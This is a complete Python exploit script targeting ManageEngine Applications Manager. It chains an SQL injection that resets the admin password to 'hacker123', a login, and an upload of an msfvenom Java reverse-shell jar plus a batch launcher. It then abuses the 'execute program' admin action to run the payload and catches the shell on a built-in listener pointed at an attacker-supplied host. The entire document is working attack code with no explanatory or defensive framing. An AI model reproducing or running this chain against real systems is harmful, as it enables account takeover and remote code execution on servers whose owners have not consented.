#!/usr/bin/python3
import requests, hashlib, sys, subprocess, urllib3, threading, socket, time
from requests_toolbelt.multipart.encoder import MultipartEncoder
urllib3.disable_warnings()

def sqli_chpw(username, password):
    global cookie
    passhash = hashlib.md5(password.encode()).hexdigest()
    print("[+] Generating MD5 password to hook admin session through sqli...")
    changepw = r.get("https://{}:{}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;UPDATE%20am_userpasswordtable%20SET%20password%20=%20$${}$$%20WHERE%20username%20=%20$${}$$;--".format(rhost,rport,passhash,username), verify=False, headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0,", "Cookie":"testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D".format(uname)})
    for c in changepw.cookies:
        cookie = c.value
def msf_jar():
    print("[+] Generating msfvenom java reverse shell:", "msfvenom -p java/shell_reverse_tcp --platform windows LHOST={} LPORT={} -o backdoor.jar".format(rhost,rport))
    result = subprocess.run(["msfvenom", "-p", "java/shell_reverse_tcp", "--platform", "windows", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-o", "backdoor.jar"], stdout=subprocess.PIPE)
    
def login_app():
    global cookie
    print("[+] Logging into application...")
    reqhead = {"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D".format(cookie,uname), "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    r.get("https://{}:{}/index.do".format(rhost,rport), verify=False, headers=reqhead)
    loginpost = r.post("https://{}:{}/j_security_check".format(rhost,rport), data={"clienttype":"html","webstart":"","j_username":uname,"ScreenWidth":"1280","ScreenHeight":"709","username":uname,"j_password":passwd,"remember":"on","submit":"Login"}, verify=False, headers=reqhead)
    cookie = loginpost.cookies['JSESSIONID_APM_9090']
    print("[+] Obtained session coookie: {}".format(cookie))

def upload_file():
    print("[+] Uploading malicious files (backdoor.jar, backdoor.bat)")
    mp_encoder_jar = MultipartEncoder(fields={"theFile":('backdoor.jar', open('backdoor.jar', 'rb'), 'application/x-java-archive'),"uploadDir":"./"})
    mp_encoder_bat = MultipartEncoder(fields={"theFile":('backdoor.bat', "java -jar backdoor.jar", 'text'),"uploadDir":"./"})
    r.get("https://{}:{}/index.do".format(rhost,rport), headers={"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D;".format(cookie,uname), "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}, verify=False)
    r.get("https://{}:{}/showTile.do?TileName=New.Admin".format(rhost,rport), headers={"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D; selectedtabId=intro; selectedtab=7_1".format(cookie,uname), "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}, verify=False)
    r.get("https://{}:{}/adminLayout.do?config_id=6&config_name=Tools&menu_type=vertical&onDemand_Id=62&tabtoselect=3".format(rhost,rport), headers={"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D; selectedtabId=intro; selectedtab=7_1".format(cookie,uname), "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}, verify=False)
    uploadjar = r.post("https://{}:{}/Upload.do".format(rhost,rport), headers={"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D; selectedtabId=intro; selectedtab=7_1".format(cookie,uname), "Content-Type":mp_encoder_jar.content_type, "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}, verify=False, data=mp_encoder_jar)
    uploadbat = r.post("https://{}:{}/Upload.do".format(rhost,rport), headers={"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D; selectedtabId=intro; selectedtab=7_1".format(cookie,uname), "Content-Type":mp_encoder_bat.content_type, "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}, verify=False, data=mp_encoder_bat)
    admitaction = r.post("https://{}:{}/adminAction.do".format(rhost,rport), headers={"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D; selectedtabId=intro; selectedtab=7_1".format(cookie,uname), "Content-Type": "application/x-www-form-urlencoded", "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}, verify=False, data={"actions":"%2FshowTile.do%3FTileName%3D.ExecProg%26haid%3Dnull", "haid":"null","method":"createExecProgAction","redirectTo":"null", "id":"0","displayname":"backdoor","serversite":"local","choosehost":"-2","host":"","monitoringmods":"TELNET","username":"","password":"","port":"23","prompt":"%24","command":"backdoor.bat","execProgExecDir":"C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working","abortafter":"1","cancel":"false"})


def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    time.sleep(2)
    print('[+] Connection received from ',addr)
    print("[+] Enjoy your java reverse shell!")
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

def exploit():
    for i in range(1,100):
        actionid = "10000{}".format(str(i).zfill(3))
        execontent = r.get("https://{}:{}/common/executeScript.do?method=testAction&actionID={}&haid=null".format(rhost,rport,actionid), headers={"Cookie":"JSESSIONID_APM_9090={}; testcookie=; am_username={}; am_check=l3LZkPvmX2bDIN2gKgeAug%3D%3D; selectedtabId=intro; selectedtab=7_1; executeProgramActionTable_sortdir=down; executeProgramActionTable_sortcol=1".format(cookie,uname), "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}, verify=False)
        if execontent.text:
            if "backdoor" in execontent.text:
                print("[+] Reverse shell obtaned with actionid:{}".format(actionid))
                break

if len(sys.argv) != 5:
    print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT>\n".format(sys.argv[0]))
    print("(+) RHOST - Remote server which runs vulnerable version of ManageEngine")
    print("(+) RPORT - Remote web-server port")
    print("(+) LHOST - Local IP Address to get shell")
    print("(+) LPORT - Local Port to get shell\n")
    sys.exit(-1)
rhost = sys.argv[1]
rport = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]
r = requests.session()
uname = "admin"
passwd = "hacker123"
listener_thread = threading.Thread(target=listen, args=(lhost, lport))

sqli_chpw(uname,passwd)
login_app()
msf_jar() 
upload_file()
listener_thread.start()
exploit()
listener_thread.join()
